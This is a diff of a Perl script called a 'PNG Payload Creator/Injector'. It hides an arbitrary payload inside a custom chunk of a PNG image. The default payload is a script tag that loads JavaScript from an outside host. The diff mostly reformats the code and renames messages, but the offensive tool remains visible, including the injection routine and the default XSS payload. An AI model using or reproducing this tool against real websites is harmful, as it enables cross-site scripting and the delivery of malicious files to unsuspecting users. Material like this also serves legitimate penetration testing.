@@ -1,6 +1,6 @@
 #!/usr/bin/perl
 #
-# PNG IDAT chunks ~ PHP payload
+# PNG Payload Creator/Injector
 #
 # coded by chinarulezzz, alexandr.savca89@gmail.com
 # credits to briandeheus, https://github.com/briandeheus
@@ -10,11 +10,12 @@
 
 use strict;
 use warnings;
-use feature qw(say);
+no  warnings    qw(redefine);
+
+use feature     qw(say);
 
 use Getopt::Long;
 use GD;
-use POSIX;
 use String::CRC32;
 
 sub systell;
@@ -30,7 +31,7 @@ GetOptions(
     'payload=s' =>  \my $payload,
     'output=s'  =>  \my $outfile,
 );
-usage(0) if $help;
+usage(0)     if $help;
 usage(1) unless $outfile;
 
 $payload //= '<script src=//nji.xyz></script>';
@@ -42,10 +43,11 @@ say <<EOF;
 
 EOF
 
-create_png unless -f $outfile;
+create_png              unless -f $outfile;
+
 inject_payload;
 
-say `file $outfile`         if -f '/usr/bin/file';
+say `file       $outfile`   if -f '/usr/bin/file';
 say `hexdump -C $outfile`   if -f '/usr/bin/hexdump';
 
 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #   
@@ -123,7 +125,7 @@ sub inject_payload {
 
     rewind($fh, 8);
 
-    say "\n[>] Write payload to the new chunk: 'pUnk'";
+    say "\n[>] Inject payload to the new chunk: 'pUnk'";
 
     # chunk size
     syswrite $fh, (pack 'I>', length $payload);
